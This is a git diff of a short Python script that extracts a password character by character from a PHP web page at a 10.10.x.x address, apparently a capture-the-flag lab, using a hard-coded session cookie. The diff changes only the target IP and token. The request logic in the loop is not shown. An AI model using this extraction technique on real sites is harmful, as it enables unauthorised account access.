@@ -1,12 +1,11 @@
 import requests, time
 
-url = 'http://10.10.176.148/index.php'
-url_logoff = 'http://10.10.176.148/logout.php'
-token = {'PHPSESSID':'gip8r7jah1gq3km00cv9m87an4'}
+url = 'http://10.10.182.148/index.php'
+url_logoff = 'http://10.10.182.148/logout.php'
+token = {'PHPSESSID':'sbmf3o32gebkpc0t1rg3o9gtg9'}
 caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
 tamanho = 20
 senha = ''
-tamanho_verdadeiro = 2324
 
 for i in range(1,tamanho + 1):
     for c in caracteres:
@@ -17,5 +16,4 @@ for i in range(1,tamanho + 1):
             senha += c
             requests.get(url_logoff,cookies=token)
             break
-
 print(senha)
